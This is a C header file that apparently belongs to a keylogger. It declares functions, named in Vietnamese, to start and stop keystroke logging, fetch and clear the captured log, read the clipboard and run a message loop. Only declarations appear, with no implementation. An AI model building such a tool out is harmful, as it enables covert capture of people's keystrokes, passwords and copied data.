#ifndef KEYLOGGER_H
#define KEYLOGGER_H
#include <stddef.h>
int khoi_dong_keylogger(void);
int dung_keylogger(void);
int lay_keylog(char* ket_qua, size_t ket_qua_size);
void xoa_keylog(void);
int kiem_tra_clipboard(char* ket_qua, size_t ket_qua_size);
int chay_message_loop(void);
#endif